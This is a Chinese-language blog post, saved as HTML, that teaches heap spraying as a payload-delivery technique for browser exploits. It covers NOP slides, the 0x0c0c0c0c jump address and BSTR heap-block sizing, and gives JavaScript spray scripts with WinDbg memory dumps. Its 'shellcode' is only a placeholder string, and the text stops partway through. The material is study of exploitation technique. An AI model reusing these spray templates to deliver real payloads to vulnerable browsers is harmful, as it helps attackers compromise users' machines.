@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/df32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/df16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"dreamfo1l.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="概念Heap Spray并不是用于实现堆漏洞利用的，Heap Spray只是一种payload传递技术，以帮助你将payload放置在可预测的内存地址，以便于你跳转或返回到payload地址。广义上讲，如果在控制EIP前，你能够在可预测的地址上分配内存，那么这就是在使用Heap Spray技术。实现Heap Spray分三步  喷射堆块 触发漏洞 控制EIP指向堆中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="heap spray技术学习">
+<meta property="og:url" content="https://dreamfo1l.github.io/2021/05/24/heap-spray/index.html">
+<meta property="og:site_name" content="dreamfoil">
+<meta property="og:description" content="概念Heap Spray并不是用于实现堆漏洞利用的，Heap Spray只是一种payload传递技术，以帮助你将payload放置在可预测的内存地址，以便于你跳转或返回到payload地址。广义上讲，如果在控制EIP前，你能够在可预测的地址上分配内存，那么这就是在使用Heap Spray技术。实现Heap Spray分三步  喷射堆块 触发漏洞 控制EIP指向堆中">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvupc2bq3j30b809zmyb.jpg">
+<meta property="og:image" content="http://tvax2.sinaimg.cn/large/0069MqrZgy1gqvuppc3lij30l10da0sx.jpg">
+<meta property="og:image" content="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvuqb4fjdj30kd0d6dgc.jpg">
+<meta property="og:image" content="http://tvax2.sinaimg.cn/large/0069MqrZgy1gqvuqfzt0yj30hv030t8z.jpg">
+<meta property="og:image" content="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvuqlte07j30hv02a754.jpg">
+<meta property="article:published_time" content="2021-05-24T07:17:07.000Z">
+<meta property="article:modified_time" content="2021-05-26T07:19:31.701Z">
+<meta property="article:author" content="dreamfoil">
+<meta property="article:tag" content="Exploit编写">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvupc2bq3j30b809zmyb.jpg">
+
+<link rel="canonical" href="https://dreamfo1l.github.io/2021/05/24/heap-spray/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>heap spray技术学习 | dreamfoil</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">dreamfoil</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/05/24/heap-spray/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="dreamfoil">
+      <meta itemprop="description" content="try harder">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dreamfoil">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          heap spray技术学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-05-24 15:17:07" itemprop="dateCreated datePublished" datetime="2021-05-24T15:17:07+08:00">2021-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-05-26 15:19:31" itemprop="dateModified" datetime="2021-05-26T15:19:31+08:00">2021-05-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Heap Spray并不是用于实现堆漏洞利用的，Heap Spray只是一种payload传递技术，以帮助你将payload放置在可预测的内存地址，以便于你跳转或返回到payload地址。<br>广义上讲，如果在控制EIP前，你能够在可预测的地址上分配内存，那么这就是在使用Heap Spray技术。<br>实现Heap Spray分三步</p>
+<ol>
+<li>喷射堆块</li>
+<li>触发漏洞</li>
+<li>控制EIP指向堆中<span id="more"></span></li>
+</ol>
+<h3 id="Heap-Spray原理和内存布局"><a href="#Heap-Spray原理和内存布局" class="headerlink" title="Heap Spray原理和内存布局"></a>Heap Spray原理和内存布局</h3><p> 喷射数据块由两部分组成</p>
+<ol>
+<li>slide code   （常见的就是NOP指令，还有一些类NOP指令，比如0x0C，0x0D,特点是不影响shellcode执行）</li>
+<li>shellcode </li>
+</ol>
+<p><strong>为什么要在shellcode前加slide code？</strong><br>成功执行shellcode的前提是从第一行开始顺序执行代码，如果内存空间充满shellcode，那么准确跳转到shellcode第一行的概率几乎为0。而在shellcode前加一段相对shellcode大很多的slide code，那么跳转时大概率会落在slidecode，进而最终执行shellcode。<br>堆块分布视图：<br><img src="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvupc2bq3j30b809zmyb.jpg" alt="1"><br>堆喷射前：<br><img src="http://tvax2.sinaimg.cn/large/0069MqrZgy1gqvuppc3lij30l10da0sx.jpg" alt="2"></p>
+<p>堆喷射后:<br><img src="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvuqb4fjdj30kd0d6dgc.jpg" alt="3">最先喷射的堆块地址位置可能是无规律的，但是大量的分配堆块的话，就会在高地址分配到连续的堆块内存。这里也是常使用0x0c0c0c0c来作为跳转地址的原因，跳转到这里会使exp更加稳定。</p>
+<h3 id="基础脚本框架"><a href="#基础脚本框架" class="headerlink" title="基础脚本框架"></a>基础脚本框架</h3><p>堆喷射是一种payload传递技术, 它充分利用了javascript的特性.<br>在编写脚本之前，需要了解，javascript中的字符串是unicode编码的，那么我们需要解决unicode的传输问题，可直接使用javascript中的unescape() 函数实现。这个函数是用于“解码编码字符串”。因此如果用一些已经是unicode的字符串赋予变量，那么它就不用再转换成unicode了，这个组合%u即可实现，一个%u占2字节，放置在里面的字节都必须反序排列</p>
+<p>先让我们在堆上分配一些简单字符串</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span> = <span class="string">&#x27;javascript&#x27;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> myvar= <span class="built_in">unescape</span>(<span class="string">&#x27;%u7264%u6165%u666D%u696F%u006C&#x27;</span>);  <span class="comment">//ascii &#x27;dreamfoil&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;allocation done&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接着用windbg搜索字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              int     3</span><br><span class="line">0:007&gt; s -a 0x00000000 L?0x7fffffff  &quot;dreamfoil&quot;</span><br><span class="line">0018a49c  64 72 65 61 6d 66 6f 69-6c 00 00 00 ab ab ab ab  dreamfoil.......</span><br></pre></td></tr></table></figure>
+
+<h5 id="BSTR字符串对象"><a href="#BSTR字符串对象" class="headerlink" title="BSTR字符串对象"></a>BSTR字符串对象</h5><p>实际当分配一个字符串后，它会变成BSTR字符串对象，该对象有一个头信息和终止符，并包含原始字符串经unicode转换后的字符串。BSTR对象的头信息有4字节(dword)，包含有unicode string的长度。在对象尾部包含有两个null字节，代表字符串的结束。<br>这里先介绍概念，后面会讲到BTSR与堆块的关系<br><img src="http://tvax2.sinaimg.cn/large/0069MqrZgy1gqvuqfzt0yj30hv030t8z.jpg" alt="4"></p>
+<p>我们已经能如愿的分配内存了，那么现在尝试分配连续的<strong>nop+shellcode</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span> = <span class="string">&#x27;javascript&#x27;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">size = <span class="number">0x1000</span>   </span></span></span><br><span class="line"><span class="javascript"><span class="xml">NopSlide = <span class="string">&#x27;&#x27;</span>;    <span class="comment">// Initial</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> shellcode= <span class="built_in">unescape</span>(<span class="string">&#x27;%u7264%u6165%u666D%u696F%u006C&#x27;</span>);  <span class="comment">//ascii &#x27;dreamfoil&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span>(c = <span class="number">0</span>; c &lt; size; c++)&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">	NopSlide += <span class="built_in">unescape</span>(<span class="string">&#x27;%u9090&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">NopSlide = NopSlide.substring(<span class="number">0</span>,size - shellcode.length); </span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//进行50次喷射</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();   <span class="comment">//用数组我们可以实现很多内存块分配，而且方法更简单便捷</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">	memory[i] = NopSlide + shellcode;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;spray done&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
+
+<p>在windbg中观察喷射区域，可以发现，较低地址的有许多缝隙，而接着往下较高地址就基本是连续的了，这也验证之前说的，跳转地址在高地址的exp更稳定。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">7c92120e cc              int     3</span><br><span class="line">0:008&gt; s -a 0x0 L? 0x7fffffff &quot;dreamfoil&quot;</span><br><span class="line">001a69a4  64 72 65 61 6d 66 6f 69-6c 00 00 00 09 00 03 00  dreamfoil.......</span><br><span class="line">001bd857  64 72 65 61 6d 66 6f 69-6c 27 0d 0a 0d 0a 2f 2f  dreamfoil&#x27;....//</span><br><span class="line">001f0c52  64 72 65 61 6d 66 6f 69-6c 00 00 00 90 90 90 90  dreamfoil.......</span><br><span class="line">001f4c82  64 72 65 61 6d 66 6f 69-6c 00 00 00 90 90 90 90  dreamfoil.......</span><br><span class="line">001febea  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00200c02  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00202c1a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00204c32  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00206c4a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00208c62  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0020dfc2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0020ffda  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00211ff2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0021400a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00216022  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0021803a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0021a052  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0021c06a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0021e082  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0022009a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">002220b2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">002240ca  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">002260e2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">002280fa  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0022a112  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0022c12a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0022e142  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0023015a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">00232172  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0023418a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">002361a2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">002381ba  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0023a1d2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0023c1ea  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">02102042  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0210405a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">02106072  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0210808a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0210a0a2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0210c0ba  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0210e0d2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">021100ea  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">02112102  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0211411a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">02116132  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0211814a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0211a162  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0211c17a  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">0211e192  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">021201aa  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">021221c2  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br><span class="line">021241da  64 72 65 61 6d 66 6f 69-6c 00 00 00 00 00 00 00  dreamfoil.......</span><br></pre></td></tr></table></figure>
+
+<p>这里观察内存还有一个问题，我发现每个块的大小在0x2000字节。而预期是0x1000<br>原因是这里有关字符串的操作函数，都是以unicode编码来算的，即length函数返回的值是字节数除以2，substring函数同理。<br>**</p>
+<h5 id="更进一步"><a href="#更进一步" class="headerlink" title="更进一步"></a>更进一步</h5><p>为了达到堆喷的目标，还要分配更多的数据填充更多的堆空间(覆写更高的内存地址)，已经改变块大小以适应BSTR对象, 是分配更稳定和连续。</p>
+<p>先看看BSTR对象与堆块的关系**<br><img src="http://tvax4.sinaimg.cn/large/0069MqrZgy1gqvuqlte07j30hv02a754.jpg" alt="5"><br>为避免间隙过大导致内存过多垃圾数据，必须正确地选取BSTR对象大小，以便于正确地分配堆块大小，使其尽可能地与BSTR对象大小相同。<br>回头观察刚才的脚本分配的堆块与BSTR对象大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">!heap -stat -h 00140000</span><br><span class="line">group-by: TOTSIZE max-display: 20</span><br><span class="line">    size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class="line">    2010 33 - 66330  (39.81)   &lt;&lt;&lt;&lt; 0x2010大小的堆块和BSTR 0x2000的大小差不多，已经接近预期                               大小</span><br><span class="line">    2000 5 - a000  (3.90)</span><br><span class="line">    8000 1 - 8000  (3.12)</span><br><span class="line">    56f8 1 - 56f8  (2.12)</span><br><span class="line">    614 e - 5518  (2.07)</span><br><span class="line">    52ac 1 - 52ac  (2.01)</span><br><span class="line">    4fe4 1 - 4fe4  (1.94)</span><br><span class="line">    4db0 1 - 4db0  (1.89)</span><br><span class="line">    20 216 - 42c0  (1.63)</span><br><span class="line">    3980 1 - 3980  (1.40)</span><br><span class="line">    800 6 - 3000  (1.17)</span><br><span class="line">    580 8 - 2c00  (1.07)</span><br><span class="line">    4e4 6 - 1d58  (0.71)</span><br><span class="line">    d8 1d - 1878  (0.60)</span><br><span class="line">    1800 1 - 1800  (0.58)</span><br><span class="line">    1530 1 - 1530  (0.52)</span><br><span class="line">    1440 1 - 1440  (0.49)</span><br><span class="line">    1424 1 - 1424  (0.49)</span><br><span class="line">    108 13 - 1398  (0.48)</span><br><span class="line">    1378 1 - 1378  (0.47)</span><br></pre></td></tr></table></figure>
+
+
+<p>其次是堆块头的大小问题，一般来讲每个堆块除了用户可访问部分之外还有一个前置元数据和后置元数据部分。前置元数据里面8字节堆块描述信息（包含块大小，堆段索引，标志等等信息）是肯定有的，前置数据里面可能还有一些字节的填充数据用于检测堆溢出，后置元数据里面主要是后置字节数和填充区域以及堆额外数据，这些额外数据（指非用户可以访问部分）加起来的大小在32字节左右</p>
+<h3 id="Heap-Spray常用脚本"><a href="#Heap-Spray常用脚本" class="headerlink" title="Heap Spray常用脚本"></a>Heap Spray常用脚本</h3><p>常见脚本类似如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&#x27;%u7264%u6165%u666D%u696F%u006C&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> bigblock = <span class="built_in">unescape</span>(<span class="string">&#x27;%u\9090%u\9090&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> headersize = <span class="number">20</span>;   </span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> slackspace = headersize + shellcode.length;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">while</span> (bigblock.length &lt; slackspace) bigblock += bigblock;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> fillblock = bigblock.substring(<span class="number">0</span>,slackspace);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> block = bigblock.substring(<span class="number">0</span>,bigblock.length - slackspace);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">while</span> (block.length + slackspace &lt; <span class="number">0x50000</span>) block = block + block + fillblock;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++)&#123; memory[i] = block + shellcode &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看堆块分配情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> heap @ 00140000</span><br><span class="line">group-by: TOTSIZE max-display: 20</span><br><span class="line">    size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class="line">    fffe0 c8 - c7fe700  (99.22)</span><br><span class="line">    fffd0 1 - fffd0  (0.50)</span><br><span class="line">    8000 1 - 8000  (0.02)</span><br><span class="line">    7fd0 1 - 7fd0  (0.02)</span><br><span class="line">    7f90 1 - 7f90  (0.02)</span><br><span class="line">    56f8 1 - 56f8  (0.01)</span><br><span class="line">    614 e - 5518  (0.01)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>0xfffe0 大小的堆块分配了 0xc8 个，约200M的堆喷<br>接下来查看几个常用地址是否被nop指令覆盖</p>
